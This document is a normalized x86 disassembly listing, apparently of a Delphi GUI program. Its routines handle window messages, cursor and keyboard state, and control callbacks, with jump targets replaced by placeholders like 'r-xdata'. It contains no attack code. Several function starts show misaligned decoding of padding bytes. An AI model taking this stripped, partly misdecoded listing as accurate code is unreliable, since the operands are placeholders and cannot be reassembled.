movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4386a4
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_4372c4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403490
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_43df6c
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_434ec0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43868f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_43df6c
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_43df6c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403294
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43714c
test esi esi
je r-xdata
sub_4386a4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403490
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_439528
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403490
mov eax esi
call sub_4371f4
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_4371b0
mov ecx eax
xor edx edx
xor eax eax
call sub_412d08
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403490
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_438748
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_438778
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_4387e4
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_4388a4
sub_438814
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_438844
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4372f0
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_438870
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_4388a4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_438978
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4389ac
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_438a44
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_44e0a8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_44e0a8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43734c
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_457854
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403490
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_44dfec
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403490
jmp r-xdata
sub_438bd8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408854
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408880
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43734c
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408698
call sub_408608
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408608
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_438c80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_438cb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_438c74
push ebp
call sub_438c80
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438d00
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_438d8c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_438dc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_438844
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df5c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403490
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df5c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403490
sub_438e48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43731c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4379e4
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_438dc4
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_438e94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43731c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_438eb0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43731c
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4379e4
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_438dc4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403490
sub_438f08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_4387e4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_438778
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_4387e4
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_438fa4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_438dc4
pop esi
pop ebx
retn
sub_438fc9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_438dc4
pop esi
pop ebx
retn
sub_438fef
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_438dc4
pop esi
pop ebx
retn
sub_439019
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_438dc4
pop esi
pop ebx
retn
sub_43903f
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_439074
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_438844
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df5c
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403490
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df5c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403490
sub_4390ec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_439124
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df5c
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403490
sub_43915c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_4379e4
mov edx edi
xor ecx ecx
mov eax ebx
call sub_439124
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4069f0
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403490
sub_4391d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_439124
pop esi
pop ebx
retn
sub_4391f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_439124
pop esi
pop ebx
retn
sub_439214
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_44df5c
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403490
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_442738
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43926c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4379d4
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_4379e4
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_438978
pop esi
retn
sub_4392ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_4389ac
sub_43935a
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_437bf4
mov cl 0x1
sub_43939c
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43794c
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43794c
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4393cc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4393f0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_4069f0
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403490
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_438978
mov [ ebx + 0xc ] eax
sub_439494
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_4378a0
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_4378a0
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_439528
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031dc
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_436f40
mov edx [ esp ]
mov eax esi
call sub_436f1c
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4371c8
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43720c
sub_4395ac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412ce0
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_4372c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
